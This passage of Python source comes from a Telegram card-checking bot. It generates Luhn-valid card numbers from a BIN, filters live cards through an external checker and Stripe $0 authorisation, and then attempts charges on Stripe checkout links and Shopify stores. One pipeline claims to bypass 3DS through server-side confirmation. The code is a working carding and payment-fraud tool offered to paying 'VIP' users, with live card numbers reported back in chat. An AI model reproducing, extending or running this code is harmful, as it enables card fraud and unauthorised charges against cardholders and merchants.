            bar  = _prog_bar(checked, len(cards_to_check))
            stg2 = "🔄 chkr.cc" if stage == "chkr" else "✅ chkr.cc"
            stg3 = ("🎯 Playwright hit → running (~30-90s)" if stage == "hit"
                    else "⏳ Playwright hitter → fires on next live")
            lines = (
                f"<b>╔══════════════════════════╗\n"
                f"║  🎯  G E N → H I T  P I P E  ║\n"
                f"╚══════════════════════════╝\n"
                f"│\n"
                f"│  💳 BIN   » <code>{bin_6}</code> {cc_flag}\n"
                f"│  🏦 Bank  » {_html.escape(bank)}\n"
                f"│  🌍 Info  » {_html.escape(bin_info)}\n"
                f"│\n"
                f"│  ✅ Gen    {len(cards_to_check)} cards\n"
                f"│  {stg2}  [{bar}] {pct}%  {checked}/{len(cards_to_check)}\n"
                f"│  ✅ Live: <b>{live_count}</b>  ⚠️ OTP: <b>{otp_count_gc}</b>  ❌ Dead: <b>{dead_count_gc}</b>\n"
                f"│  🎯 H tried: <b>{h_tried}</b>\n"
            )
            if cur_card:
                lines += f"│  🔍 » <code>{_html.escape(cur_card)}</code>\n"
            if stage == "hit" and h_word:
                lines += f"│  {h_icon} {h_word}"
                if h_raw:
                    lines += f" — {_html.escape(h_raw[:50])}"
                lines += "\n"
            lines += f"│\n│  {stg3}\n└────────────────────────────</b>"
            return lines

        live_count    = 0
        otp_count_gc  = 0
        dead_count_gc = 0
        h_tried       = 0
        t0_gc         = time.time()

        h_hit  = None
        h_msg  = None
        h_icon = None
        h_word = None
        h_res  = None

        for i, card in enumerate(cards_to_check, 1):
            # ── Stage 2: chkr.cc ────────────────────────────────────
            resp = _chkrcc(card)
            code = resp.get("code", -1)

            if code == 1:
                live_count += 1
            elif code == 2:
                otp_count_gc += 1
            else:
                dead_count_gc += 1

            if i % 2 == 0 or i == len(cards_to_check):
                try:
                    bot.edit_message_text(_pipe_msg(i, card, "chkr"),
                        chat_id=prog.chat.id, message_id=prog.message_id, parse_mode="HTML")
                except Exception:
                    pass

            if code != 1:
                continue   # OTP / dead — skip hitter

            # ── Stage 3: live card → Playwright hit ─────────────────
            h_tried += 1
            try:
                bot.edit_message_text(_pipe_msg(i, card, "hit", "⏳", "Hitting..."),
                    chat_id=prog.chat.id, message_id=prog.message_id, parse_mode="HTML")
            except Exception:
                pass

            result = _dlx_hit_single(checkout_url, card, timeout=120)
            st     = result.get("status", "")
            r_msg  = result.get("message", "")[:60]
            em     = _h_emoji(result)
            wd     = _h_word(result)

            try:
                bot.edit_message_text(_pipe_msg(i, card, "hit", em, wd, r_msg),
                    chat_id=prog.chat.id, message_id=prog.message_id, parse_mode="HTML")
            except Exception:
                pass

            if st in ("approved", "insufficient_funds"):
                h_hit  = card
                h_msg  = r_msg
                h_icon = em
                h_word = wd
                h_res  = result
                break

        total_time = round(time.time() - t0_gc, 1)
        provider   = _html.escape(str(h_res.get("provider", "Stripe")) if h_res else "Stripe")
        amount     = _html.escape(str(h_res.get("amount", "N/A")) if h_res else "N/A")

        if h_hit:
            bot.edit_message_text(
                f"<b>╔══════════════════════════╗\n"
                f"║  🎯  G E N → H I T  !!!  ║\n"
                f"╚══════════════════════════╝\n"
                f"│\n"
                f"│  {h_icon}  <b>{h_word}</b>\n"
                f"│\n"
                f"│  💳 Card    » <code>{_html.escape(h_hit)}</code>\n"
                f"│  🏦 Bank    » {_html.escape(bank)}\n"
                f"│  🌍 Info    » {_html.escape(bin_info)}\n"
                f"│  💬 Msg     » {_html.escape(h_msg)}\n"
                f"│  💵 Amount  » {amount}\n"
                f"│  🔌 Gate    » {provider}\n"
                f"│\n"
                f"│  📊 Stats\n"
                f"│  ├ Gen      » {len(cards_to_check)} cards\n"
                f"│  ├ Live     » {live_count} ({otp_count_gc} OTP)\n"
                f"│  ├ H tried  » {h_tried}\n"
                f"│  └ Time     » {total_time}s\n"
                f"│\n"
                f"│  👤 By » @{_uname}\n"
                f"└────────────────────────────</b>",
                chat_id=prog.chat.id, message_id=prog.message_id, parse_mode="HTML")
        else:
            _otp_note = f"│  ⚠️ OTP found: {otp_count_gc} (skipped)\n" if otp_count_gc else ""
            bot.edit_message_text(
                f"<b>╔══════════════════════════╗\n"
                f"║  🎯  G E N → H I T  P I P E  ║\n"
                f"╚══════════════════════════╝\n"
                f"│\n"
                f"│  ❌  NO HIT\n"
                f"│\n"
                f"│  💳 BIN   » <code>{bin_6}</code> {cc_flag}\n"
                f"│  🏦 Bank  » {_html.escape(bank)}\n"
                f"│  🌍 Info  » {_html.escape(bin_info)}\n"
                f"│\n"
                f"│  📊 Stats\n"
                f"│  ├ Gen    » {len(cards_to_check)} cards\n"
                f"│  ├ Live   » {live_count} ({otp_count_gc} OTP)\n"
                f"│  ├ H tried» {h_tried}\n"
                f"│  └ Time   » {total_time}s\n"
                f"{_otp_note}"
                f"│\n"
                f"│  👤 By  » @{_uname}\n"
                f"└────────────────────────────</b>",
                chat_id=prog.chat.id, message_id=prog.message_id, parse_mode="HTML")

    threading.Thread(target=my_function).start()

# ================== /gpi — GEN → chkr.cc → PI Direct Bypass Pipeline ==================
@bot.message_handler(commands=["gpi"])
def gpi_command(message):
    """Pipeline: BIN → generate cards → chkr.cc live filter → Stripe PI direct bypass"""
    def my_function():
        import html as _html
        uid = message.from_user.id
        try:
            with open("data.json", "r", encoding="utf-8") as _f:
                _jd = json.load(_f)
            BL = _jd.get(str(uid), {}).get("plan", "𝗙𝗥𝗘𝗘")
        except Exception:
            BL = "𝗙𝗥𝗘𝗘"
        if BL == "𝗙𝗥𝗘𝗘" and uid != admin:
            bot.reply_to(message, "<b>❌ VIP only command.</b>", parse_mode="HTML")
            return

        usage_msg = (
            "<b>╔══ ⚡ GEN → LIVE → PI BYPASS PIPELINE ══╗\n\n"
            "📌 Usage:\n"
            "<code>/gpi &lt;checkout_url&gt; &lt;BIN&gt; [count]</code>\n\n"
            "📌 Example:\n"
            "<code>/gpi https://buy.stripe.com/xxx 411111 15</code>\n\n"
            "🔄 Pipeline:\n"
            "  1️⃣ Generate N cards from BIN\n"
            "  2️⃣ chkr.cc → filter live cards\n"
            "  3️⃣ Stripe PI Direct → confirm without browser\n"
            "     (attempts 3DS bypass via server-side confirm)\n\n"
            "💡 count = how many to gen (default 15, max 50)\n"
            "⚡ Fastest pipeline — ~3-10s per card\n"
            "✅ Best on: buy.stripe.com / ppage_ sessions</b>"
        )

        try:
            parts = message.text.split(None, 3)
            if len(parts) < 3:
                bot.reply_to(message, usage_msg, parse_mode="HTML")
                return
            checkout_url = parts[1].strip()
            bin_arg      = parts[2].strip()
            gen_count    = int(parts[3].strip()) if len(parts) == 4 else 15
            gen_count    = min(max(gen_count, 3), 50)
        except Exception:
            bot.reply_to(message, usage_msg, parse_mode="HTML")
            return

        if not re.match(r'^\d{6,8}', bin_arg):
            bot.reply_to(message, "<b>❌ Invalid BIN. Must be 6-8 digits.</b>", parse_mode="HTML")
            return

        bin_6 = bin_arg[:6]
        bin_info, bank, country, cc_flag = get_bin_info(bin_6)
        _uname = _html.escape(str(message.from_user.username or uid))

        log_command(message, query_type="gateway", gateway="gpi")

        is_amex = bin_6[0] == '3'
        clen    = 15 if is_amex else 16

        def _luhn_ok(n):
            d = [int(x) for x in n]
            odd = d[-1::-2]; even = d[-2::-2]
            return (sum(odd) + sum(sum(divmod(x*2,10)) for x in even)) % 10 == 0

        def _gen_one():
            cc_n = bin_6
            while len(cc_n) < clen - 1:
                cc_n += str(random.randint(0, 9))
            for ck in range(10):
                if _luhn_ok(cc_n + str(ck)):
                    cc_n += str(ck); break
            mm  = str(random.randint(1, 12)).zfill(2)
            cur = datetime.now().year % 100
            yy  = str(random.randint(cur + 1, cur + 5)).zfill(2)
            cvv = str(random.randint(1000,9999)) if is_amex else str(random.randint(100,999)).zfill(3)
            return f"{cc_n}|{mm}|{yy}|{cvv}"

        cards_to_check = []
        seen = set()
        for _ in range(gen_count * 10):
            if len(cards_to_check) >= gen_count:
                break
            c = _gen_one()
            if c not in seen:
                seen.add(c); cards_to_check.append(c)

        prog = bot.reply_to(message,
            f"<b>╔══════════════════════════╗\n"
            f"║  ⚡  G E N → P I  P I P E  ║\n"
            f"╚══════════════════════════╝\n"
            f"│\n"
            f"│  💳 BIN   » <code>{bin_6}</code> {cc_flag}\n"
            f"│  🏦 Bank  » {_html.escape(bank)}\n"
            f"│  🌍 Info  » {_html.escape(bin_info)}\n"
            f"│\n"
            f"│  ✅ Stage 1  {len(cards_to_check)} cards generated\n"
            f"│  🔄 Stage 2  chkr.cc live filter → starting...\n"
            f"│  [░░░░░░░░░░░░] 0%\n"
            f"│\n"
            f"│  ⏳ Stage 3  PI Direct bypass → pending\n"
            f"└────────────────────────────</b>", parse_mode="HTML")

        def _chkrcc(card):
            try:
                r = requests.post("https://api.chkr.cc/",
                    json={"data": card},
                    headers={"Content-Type": "application/json"}, timeout=10)
                if r.status_code == 200:
                    data = r.json()
                    if not ("error" in data and
                            ("quota" in str(data.get("message","")).lower() or
                             "rate" in str(data.get("message","")).lower())):
                        return data
            except Exception:
                pass
            try:
                res, _lbl = stripe_auth_ex(card, None)
                res_l = res.lower()
                if "approved" in res_l and "otp" not in res_l and "insufficient" not in res_l:
                    return {"code": 1, "message": res, "card": {}}
                if "otp" in res_l or "requires_action" in res_l or "3ds" in res_l:
                    return {"code": 2, "message": res, "card": {}}
                if "declined" in res_l or "insufficient" in res_l:
                    return {"code": 3, "message": res, "card": {}}
            except Exception:
                pass
            return {"code": -1, "status": "Error", "message": "", "card": {}}

        _BAR_W = 12

        def _prog_bar(done, total, width=_BAR_W):
            filled = int(width * done / total) if total else 0
            return "█" * filled + "░" * (width - filled)

        def _pipe_msg(checked, cur_card="", stage="chkr", pi_icon="", pi_word="", pi_raw=""):
            pct  = int(checked / len(cards_to_check) * 100) if cards_to_check else 0
            bar  = _prog_bar(checked, len(cards_to_check))
            stg2 = "🔄 chkr.cc" if stage == "chkr" else "✅ chkr.cc"
            stg3 = ("⚡ PI Direct → bypassing 3DS..." if stage == "pi"
                    else "⏳ PI bypass → fires on next live")
            lines = (
                f"<b>╔══════════════════════════╗\n"
                f"║  ⚡  G E N → P I  P I P E  ║\n"
                f"╚══════════════════════════╝\n"
                f"│\n"
                f"│  💳 BIN   » <code>{bin_6}</code> {cc_flag}\n"
                f"│  🏦 Bank  » {_html.escape(bank)}\n"
                f"│  🌍 Info  » {_html.escape(bin_info)}\n"
                f"│\n"
                f"│  ✅ Gen    {len(cards_to_check)} cards\n"
                f"│  {stg2}  [{bar}] {pct}%  {checked}/{len(cards_to_check)}\n"
                f"│  ✅ Live: <b>{live_count}</b>  ⚠️ OTP: <b>{otp_count_gc}</b>  ❌ Dead: <b>{dead_count_gc}</b>\n"
                f"│  ⚡ PI tried: <b>{pi_tried}</b>\n"
            )
            if cur_card:
                lines += f"│  🔍 » <code>{_html.escape(cur_card)}</code>\n"
            if stage == "pi" and pi_word:
                lines += f"│  {pi_icon} {pi_word}"
                if pi_raw:
                    lines += f" — {_html.escape(pi_raw[:50])}"
                lines += "\n"
            lines += f"│\n│  {stg3}\n└────────────────────────────</b>"
            return lines

        live_count    = 0
        otp_count_gc  = 0
        dead_count_gc = 0
        pi_tried      = 0
        t0_gc         = time.time()

        pi_hit  = None
        pi_msg  = None
        pi_icon = None
        pi_word = None
        pi_res  = None
        pi_3ds  = 0

        for i, card in enumerate(cards_to_check, 1):
            resp = _chkrcc(card)
            code = resp.get("code", -1)

            if code == 1:
                live_count += 1
            elif code == 2:
                otp_count_gc += 1
            else:
                dead_count_gc += 1

            if i % 2 == 0 or i == len(cards_to_check):
                try:
                    bot.edit_message_text(_pipe_msg(i, card, "chkr"),
                        chat_id=prog.chat.id, message_id=prog.message_id, parse_mode="HTML")
                except Exception:
                    pass

            if code != 1:
                continue

            # ── Stage 3: PI Direct Bypass ────────────────────────────────
            pi_tried += 1
            try:
                bot.edit_message_text(_pipe_msg(i, card, "pi", "⏳", "PI Bypassing..."),
                    chat_id=prog.chat.id, message_id=prog.message_id, parse_mode="HTML")
            except Exception:
                pass

            result = _stripe_pi_bypass(checkout_url, card, timeout=35)
            st     = result.get("status", "")
            r_msg  = result.get("message", "")[:60]

            if st == "approved":
                em = "✅"; wd = "APPROVED"
            elif st == "insufficient_funds":
                em = "💰"; wd = "FUNDS"
            elif st == "3ds":
                em = "⚠️"; wd = "3DS/OTP"
                pi_3ds += 1
            else:
                em = "❌"; wd = "DECLINED"

            try:
                bot.edit_message_text(_pipe_msg(i, card, "pi", em, wd, r_msg),
                    chat_id=prog.chat.id, message_id=prog.message_id, parse_mode="HTML")
            except Exception:
                pass

            if st in ("approved", "insufficient_funds"):
                pi_hit  = card
                pi_msg  = r_msg
                pi_icon = em
                pi_word = wd
                pi_res  = result
                break

        total_time = round(time.time() - t0_gc, 1)
        method_lbl = _html.escape(str(pi_res.get("method", "pi_direct")) if pi_res else "pi_direct")

        if pi_hit:
            bot.edit_message_text(
                f"<b>╔══════════════════════════╗\n"
                f"║  ⚡  G E N → P I  H I T !  ║\n"
                f"╚══════════════════════════╝\n"
                f"│\n"
                f"│  {pi_icon}  <b>{pi_word}</b>\n"
                f"│\n"
                f"│  💳 Card    » <code>{_html.escape(pi_hit)}</code>\n"
                f"│  🏦 Bank    » {_html.escape(bank)}\n"
                f"│  🌍 Info    » {_html.escape(bin_info)}\n"
                f"│  💬 Msg     » {_html.escape(pi_msg)}\n"
                f"│  ⚡ Method  » {method_lbl}\n"
                f"│\n"
                f"│  📊 Stats\n"
                f"│  ├ Gen      » {len(cards_to_check)} cards\n"
                f"│  ├ Live     » {live_count} ({otp_count_gc} OTP)\n"
                f"│  ├ PI tried » {pi_tried}  ({pi_3ds} still 3DS)\n"
                f"│  └ Time     » {total_time}s\n"
                f"│\n"
                f"│  👤 By » @{_uname}\n"
                f"└────────────────────────────</b>",
                chat_id=prog.chat.id, message_id=prog.message_id, parse_mode="HTML")
        else:
            _3ds_note = f"│  ⚠️ 3DS blocked: {pi_3ds} cards (merchant enforces 3DS)\n" if pi_3ds else ""
            _otp_note = f"│  ⚠️ OTP (chkr.cc): {otp_count_gc} (skipped)\n" if otp_count_gc else ""
            bot.edit_message_text(
                f"<b>╔══════════════════════════╗\n"
                f"║  ⚡  G E N → P I  P I P E  ║\n"
                f"╚══════════════════════════╝\n"
                f"│\n"
                f"│  ❌  NO HIT\n"
                f"│\n"
                f"│  💳 BIN   » <code>{bin_6}</code> {cc_flag}\n"
                f"│  🏦 Bank  » {_html.escape(bank)}\n"
                f"│  🌍 Info  » {_html.escape(bin_info)}\n"
                f"│\n"
                f"│  📊 Stats\n"
                f"│  ├ Gen    » {len(cards_to_check)} cards\n"
                f"│  ├ Live   » {live_count} ({otp_count_gc} OTP)\n"
                f"│  ├ PI     » {pi_tried} tried\n"
                f"│  └ Time   » {total_time}s\n"
                f"{_3ds_note}"
                f"{_otp_note}"
                f"│\n"
                f"│  👤 By  » @{_uname}\n"
                f"└────────────────────────────</b>",
                chat_id=prog.chat.id, message_id=prog.message_id, parse_mode="HTML")

    threading.Thread(target=my_function).start()

# ================== /auth — Assoc Stripe Auth Checker ==================
@bot.message_handler(commands=["auth"])
def auth_command(message):
    def my_function():
        id = message.from_user.id
        with open("data.json", 'r', encoding='utf-8') as file:
            json_data = json.load(file)
        try:
            BL = json_data[str(id)]['plan']
        except:
            BL = '𝗙𝗥𝗘𝗘'
        if BL == '𝗙𝗥𝗘𝗘' and id != admin:
            bot.reply_to(message, "<b>❌ 𝗧𝗵𝗶𝘀 𝗰𝗼𝗺𝗺𝗮𝗻𝗱 𝗶𝘀 𝗼𝗻𝗹𝘆 𝗳𝗼𝗿 𝗩𝗜𝗣 𝘂𝘀𝗲𝗿𝘀.</b>", parse_mode='HTML')
            return

        proxy = get_proxy_dict(id)

        # ── Try to get ALL cards (reply to gc/txt/multi) ──────────────────
        cards = _get_cards_from_message(message)

        if not cards:
            bot.reply_to(message,
                "<b>╔══════════════════════════╗\n"
                "║  🔐  A U T H  C H E C K  ║\n"
                "╚══════════════════════════╝\n"
                "│\n"
                "│ 📌 Usage:\n"
                "│  <code>/auth card</code>\n"
                "│  Reply to any card message\n"
                "│  Reply to a .txt file\n"
                "│\n"
                "│ 💡 Example:\n"
                "│  <code>/auth 4111111111111111|12|26|123</code>\n"
                "│\n"
                "│ ⚡ Gateway: AssocMgmt Stripe $0 Auth\n"
                "└──────────────────────────</b>",
                parse_mode='HTML')
            return

        # ── SINGLE card → detailed result ─────────────────────────────────
        if len(cards) == 1:
            card = cards[0]
            bin_num = card.replace('|','')[:6]
            bin_info, bank, country, cc_flag = get_bin_info(bin_num)

            msg = bot.reply_to(message,
                f"<b>⚡ ════ AUTH CHECK ════ ⚡\n"
                f"│ 💳 <code>{card}</code>\n"
                f"│ 🎰 BIN: {bin_num} {cc_flag}\n"
                f"│ 🏦 {bank}\n"
                f"└──────────────────────────\n"
                f"⏳ Smart check — Layer 1 (AssocMgmt)...</b>",
                parse_mode='HTML')

            result  = _auth_smart_check(card, proxy)
            s       = result.get("status", "")
            m       = result.get("message", "")
            gw      = result.get("gateway", "AssocMgmt $0")
            elapsed = result.get("elapsed", 0)
            layer   = result.get("layer", 1)
            layer_tag = "🥇 Primary" if layer == 1 else "🔄 Fallback"

            if s == "approved":
                if "OTP" in m or "3DS" in m or "otp" in m.lower():
                    em, word, top = "⚠️", "OTP/3DS", "✨ ✦ ─── O T P / 3 D S ─── ✦ ✨"
                else:
                    em, word, top = "✅", "Approved", "✨ ✦ ─── A P P R O V E D ─── ✦ ✨"
                    _add_to_merge(id, card)
                    _notify_live_hit(message.chat.id, card, "auth")
            elif s == "dead":
                em, word, top = "❌", "Declined", "✨ ✦ ─── D E C L I N E D ─── ✦ ✨"
            else:
                em, word, top = "🔴", "Error", "✨ ✦ ─── E R R O R ─── ✦ ✨"

            out = (
                f"<b>{top}\n"
                f"╔══════════════════════════╗\n"
                f"║  🔐  A U T H  C H E C K  ║\n"
                f"╚══════════════════════════╝\n"
                f"│ {em} {word}  ❯  <code>{card}</code>\n"
                f"│ 📝 {m}\n"
                f"├──────────────────────────\n"
                f"│ 🎰 BIN: {bin_num} {cc_flag}\n"
                f"│ 🏦 {bank}\n"
                f"│ 💳 {bin_info}\n"
                f"│ 🌍 {country}\n"
                f"├──────────────────────────\n"
                f"│ 🌐 Gateway: {gw}\n"
                f"│ {layer_tag} · ⏱️ {elapsed}s\n"
                f"└──────────────────────────\n"
                f"       ⌤ Bot by @yadistan</b>"
            )
            kb = types.InlineKeyboardMarkup(row_width=2)
            kb.add(
                types.InlineKeyboardButton(text="💬 Support", url="https://t.me/yadistan"),
                types.InlineKeyboardButton(text="🤖 Bot", url="https://t.me/stcheckerbot"),
            )
            try:
                bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id,
                                      text=out, parse_mode='HTML', reply_markup=kb)
            except:
                pass
            log_card_check(id, card, 'auth', m[:80])
            return

        # ── MULTI card → parallel mass-check ──────────────────────────────
        import threading as _th
        from concurrent.futures import ThreadPoolExecutor, as_completed

        total   = len(cards)
        live    = 0
        dead    = 0
        otp     = 0
        error   = 0
        checked = 0
        results_lines = []
        _lock = _th.Lock()

        try:
            stopuser[f'{id}']['status'] = 'start'
        except:
            stopuser[f'{id}'] = {'status': 'start'}

        stop_kb = types.InlineKeyboardMarkup()
        stop_kb.add(types.InlineKeyboardButton(text="🛑 Stop", callback_data='stop'))

        def build_auth_mass(status_text="⏳ Checking..."):
            if "Completed" in status_text:
                status_line = "✅ Completed!"
            elif "STOPPED" in status_text:
                status_line = "🛑 Stopped by User"
            else:
                pct = int((checked / total * 100)) if total else 0
                bar_filled = int(pct / 10)
                bar = "█" * bar_filled + "░" * (10 - bar_filled)
                status_line = f"⏳ [{bar}] {pct}%"

            txt  = f"<b>╔══════════════════════════╗\n"
            txt += f"║  🔐  AUTH MASS CHECKER   ║\n"
            txt += f"╚══════════════════════════╝\n"
            txt += f"\n🔰 Status  »  {status_line}\n"
            txt += f"\n┌─────── 📊 Statistics ───────\n"
            txt += f"│  🏁  Checked  »  {checked} / {total}\n"
            txt += f"│  ✅  Approved  »  {live}\n"
            txt += f"│  ⚠️  OTP/3DS   »  {otp}\n"
            txt += f"│  ❌  Dead      »  {dead}\n"
            txt += f"│  🔴  Error     »  {error}\n"
            txt += f"└─────────────────────────────\n"
            if results_lines:
                txt += f"\n━━━━━ 📋 Results ━━━━━━━━━━━━\n"
                txt += "\n".join(results_lines[-15:])
                txt += f"\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            txt += f"\n⌤ Dev by: YADISTAN 🍀</b>"
            return txt

        msg = bot.reply_to(message, build_auth_mass(), parse_mode='HTML', reply_markup=stop_kb)

        def _check_one(cc):
            """Worker: check single card, return (cc, result_dict)."""
            return cc, _auth_smart_check(cc.strip(), proxy)

        WORKERS = min(3, total)   # max 3 parallel workers

        with ThreadPoolExecutor(max_workers=WORKERS) as executor:
            futures = {executor.submit(_check_one, cc): cc for cc in cards}

            for future in as_completed(futures):
                if stopuser.get(f'{id}', {}).get('status') == 'stop':
                    executor.shutdown(wait=False, cancel_futures=True)
                    try:
                        bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id,
                                              text=build_auth_mass("🛑 STOPPED"), parse_mode='HTML')
                    except:
                        pass
                    return

                try:
                    cc, result = future.result()
                except Exception:
                    continue

                s     = result.get("status", "")
                m_txt = result.get("message", "")
                gw    = result.get("gateway", "?")
                layer = result.get("layer", 1)
                gw_icon = "🥇" if layer == 1 else "🔄"

                with _lock:
                    if s == "approved":
                        if "OTP" in m_txt or "3DS" in m_txt or "otp" in m_txt.lower():
                            em = "⚠️"; otp += 1; label = "OTP/3DS"
                        else:
                            em = "✅"; live += 1; label = "Approved"
                            _add_to_merge(id, cc)
                            _notify_live_hit(message.chat.id, cc, "auth")
                    elif s == "dead":
                        em = "❌"; dead += 1; label = "Declined"
                    else:
                        em = "🔴"; error += 1; label = "Error"

                    checked += 1
                    results_lines.append(
                        f"{em} <code>{cc}</code>\n"
                        f"   ↳ {label} — {m_txt[:35]} {gw_icon}"
                    )
                    log_card_check(id, cc, 'auth', m_txt[:80])

                try:
                    stop_kb2 = types.InlineKeyboardMarkup()
                    stop_kb2.add(types.InlineKeyboardButton(text="🛑 Stop", callback_data='stop'))
                    bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id,
                                          text=build_auth_mass(), parse_mode='HTML',
                                          reply_markup=stop_kb2)
                except:
                    pass

        try:
            kb_done = types.InlineKeyboardMarkup(row_width=2)
            kb_done.add(
                types.InlineKeyboardButton(text="💬 Support", url="https://t.me/yadistan"),
                types.InlineKeyboardButton(text="🤖 Bot", url="https://t.me/stcheckerbot"),
            )
            bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id,
                                  text=build_auth_mass("✅ Completed!"), parse_mode='HTML',
                                  reply_markup=kb_done)
        except:
            pass

    threading.Thread(target=my_function).start()

# ================== /sp — Auto Shopify v6 Checker ==================
def _sp_status(msg_code, success_flag):
    """Map Shopify result code → (emoji, label, is_hit)."""
    code = (msg_code or '').upper()
    if code == 'ORDER_PLACED':
        return '💰', 'CHARGED', True
    if 'OTP' in code or 'ACTION_REQUIRED' in code or 'CHALLENGE' in code:
        return '⚡', 'OTP/3DS', True
    if code in ('CARD_DECLINED','PAYMENTS_CARD_DECLINED','CARD_VELOCITY_EXCEEDED',
                'PAYMENTS_CARD_VELOCITY_EXCEEDED','CALL_ISSUER','DO_NOT_HONOR',
                'FRAUDULENT','GENERIC_DECLINE'):
        return '❌', 'Dead', False
    if 'INSUFFICIENT' in code:
        return '💳', 'Insufficient Funds', True
    if 'CAPTCHA' in code or 'THROTTLE' in code.upper():
        return '🔴', 'Error', False
    if not success_flag:
        return '🔴', 'Error', False
    return '❌', 'Dead', False


@bot.message_handler(commands=["sp"])
def sp_command(message):
    def my_function():
        uid = message.from_user.id
        with open("data.json", 'r', encoding='utf-8') as f:
            json_data = json.load(f)
        try:
            BL = json_data[str(uid)]['plan']
        except:
            BL = '𝗙𝗥𝗘𝗘'
        if BL == '𝗙𝗥𝗘𝗘' and uid != admin:
            bot.reply_to(message, "<b>❌ This command is only for VIP users.</b>", parse_mode='HTML')
            return

        usage_msg = (
            "<b>╔══════════════════════════════╗\n"
            "║  🛒 AUTO SHOPIFY v6 CHECKER  ║\n"
            "╚══════════════════════════════╝\n\n"
            "🔰 Gateway  »  Real Shopify Checkout\n"
            "⚡ Method    »  Auto cheapest product · GraphQL\n\n"
            "━━━━━ 📌 Usage ━━━━━━━━━━━━━━━━━\n\n"
            "▸ Single card:\n"
            "<code>/sp https://store.myshopify.com 4111...|12|26|123</code>\n\n"
            "▸ Multi card (max 30):\n"
            "<code>/sp https://store.myshopify.com\n"
            "4111111111111111|12|2026|123\n"
            "5218071175156668|02|2026|574</code>\n\n"
            "━━━━━ 📊 Results ━━━━━━━━━━━━━━━━\n\n"
            "💰 Charged   →  Live, payment taken\n"
            "⚡ OTP        →  3DS / Auth required\n"
            "❌ Dead       →  Declined\n"
            "🔴 Error      →  Site / network issue\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            "⚠️ <i>VIP only · real purchase attempt · charges may apply</i>\n\n"
            "⌤ Dev by: YADISTAN 🍀</b>"
        )

        # ── Parse site + cards ────────────────────────────────────────────
        try:
            lines = message.text.split('\n')
            first_parts = lines[0].split(None, 2)
            if len(first_parts) < 2:
                raise IndexError
            site_url = first_parts[1].strip()
            if not site_url.startswith('http') and '.' not in site_url:
                raise ValueError

            raw_lines = []
            if len(first_parts) == 3:
                raw_lines.append(first_parts[2])
            if len(lines) > 1:
                raw_lines += [l.strip() for l in lines[1:] if l.strip()]
        except (IndexError, ValueError):
            bot.reply_to(message, usage_msg, parse_mode='HTML')
            return

        replied = message.reply_to_message
        if not raw_lines and replied:
            if replied.document and replied.document.file_name and replied.document.file_name.lower().endswith('.txt'):
                try:
                    file_info = bot.get_file(replied.document.file_id)
                    downloaded = bot.download_file(file_info.file_path)
                    file_text = downloaded.decode('utf-8', errors='ignore')
                    raw_lines = [l.strip() for l in file_text.split('\n') if l.strip()]
                except Exception as e:
                    bot.reply_to(message, f"<b>❌ File download failed: {str(e)[:80]}</b>", parse_mode='HTML')
                    return
            elif replied.text:
                raw_lines = [l.strip() for l in replied.text.split('\n') if l.strip()]
            elif replied.caption:
                raw_lines = [l.strip() for l in replied.caption.split('\n') if l.strip()]

        card_lines = []
        for rl in raw_lines:
            cc = _extract_cc(rl)
            if cc:
                card_lines.append(cc)

        if not card_lines:
            bot.reply_to(message, usage_msg if not raw_lines else
                "<b>❌ Invalid card format.\n"
                "Correct: <code>4111111111111111|12|2026|123</code></b>", parse_mode='HTML')
            return

        if len(card_lines) > 99999999999:
            bot.reply_to(message, "<b>❌ Maximum limit exceeded for Shopify.</b>", parse_mode='HTML')
            return

        log_command(message, query_type='gateway', gateway='shopify_v6')

        # ── Single card ────────────────────────────────────────────────────
        if len(card_lines) == 1:
            card   = card_lines[0]
            parts  = card.split('|')
            cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3].strip()
            bin_num = cc[:6]
            bin_info, bank, country, country_code = get_bin_info(bin_num)

            msg = bot.reply_to(message,
                f"<b>⏳ Checking [Shopify v6]...\n"
                f"🛒 Site: <code>{site_url[:50]}</code>\n"
                f"💳 Card: <code>{card}</code></b>", parse_mode='HTML')

            _s_clean = site_url.replace("https://", "").replace("http://", "").rstrip("/")
            _s_vid, _s_price, _s_handle, _ = _asp_find_product(_s_clean)
            success, response, gateway, price, currency = _asp_run(
                card, site_url, _variant_id=_s_vid, _price=_s_price, _handle=_s_handle
            )
            clean_code = _sp_clean(response)
            em, word, is_hit = _sp_status(clean_code, success)
            log_card_check(uid, card, 'shopify_v6', clean_code[:80])

            try:
                price_f = f"{float(price):.2f}"
            except Exception:
                price_f = price

            out = (
                f"<b>{em} {word}  ❯  <code>{card}</code>\n"
                f"━━━━━━━━━━━━━━━━\n"
                f"🏦 BIN: {bin_num}  •  {bin_info}\n"
                f"🏛️ Bank: {bank}\n"
                f"🌍 Country: {country} {country_code}\n"
                f"━━━━━━━━━━━━━━━━\n"
                f"🛒 Site: {site_url[:50]}\n"
                f"🏷️ Gateway: {gateway[:40]}\n"
                f"💵 Price: {price_f} {currency}\n"
                f"💬 Msg: {clean_code[:80]}\n"
                f"━━━━━━━━━━━━━━━━\n"
                f"[⌤] Bot by @yadistan</b>"
            )
            bot.edit_message_text(out, message.chat.id, msg.message_id, parse_mode='HTML')
            return

        # ── Bulk ──────────────────────────────────────────────────────────
        total    = len(card_lines)
        charged  = dead = err = otp = checked = 0
        results_lines = []
        hits = []

        stop_kb = types.InlineKeyboardMarkup()
        stop_kb.add(types.InlineKeyboardButton(text="🛑 Stop", callback_data='stop'))
        try:
            stopuser[f'{uid}']['status'] = 'start'
        except:
            stopuser[f'{uid}'] = {'status': 'start'}

        msg = bot.reply_to(message,
            f"<b>🛒 Shopify v6 Checker\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"🌐 {site_url[:45]}\n"
            f"📋 Total: {total} cards\n⏳ Fetching product...</b>",
            reply_markup=stop_kb, parse_mode='HTML')

        # ── Pre-fetch product ONCE for all cards ───────────────────────────
        _site_clean = site_url.replace("https://", "").replace("http://", "").rstrip("/")
        _cached_vid, _cached_price, _cached_handle, _find_status = _asp_find_product(_site_clean)
        _product_label = f"${float(_cached_price):.2f}" if _cached_price else "?"
        try:
            bot.edit_message_text(
                f"<b>🛒 Shopify v6 Checker\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
                f"🌐 {site_url[:45]}\n"
                f"📦 Product: {_product_label}\n"
                f"📋 Total: {total} cards\n⏳ Checking...</b>",
